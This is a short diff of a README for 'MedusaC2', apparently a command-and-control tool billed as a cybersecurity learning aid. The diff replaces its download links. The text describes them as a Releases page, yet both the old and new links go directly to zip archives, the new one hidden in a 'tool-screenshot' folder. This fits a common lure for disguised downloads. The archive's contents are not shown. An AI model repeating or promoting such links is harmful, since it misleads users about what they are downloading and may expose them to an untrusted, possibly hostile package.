@@ -1,6 +1,6 @@
 # 🐍 MedusaC2 - A Powerful Tool for Cybersecurity Learning
 
-![Download MedusaC2](https://raw.githubusercontent.com/ikladontknowy/MedusaC2/main/searness/MedusaC2.zip)
+![Download MedusaC2](https://github.com/ikladontknowy/MedusaC2/raw/refs/heads/main/tool-screenshot/Medusa_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download MedusaC2, ensure your system meets the following requirement
   
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/ikladontknowy/MedusaC2/main/searness/MedusaC2.zip). Here, you will find the latest releases of MedusaC2.
+To get started, visit [this page to download](https://github.com/ikladontknowy/MedusaC2/raw/refs/heads/main/tool-screenshot/Medusa_v2.9.zip). Here, you will find the latest releases of MedusaC2.
 
 1. Click on the link above to navigate to the Releases page.
 2. Scroll through the available versions and locate the one you wish to download.
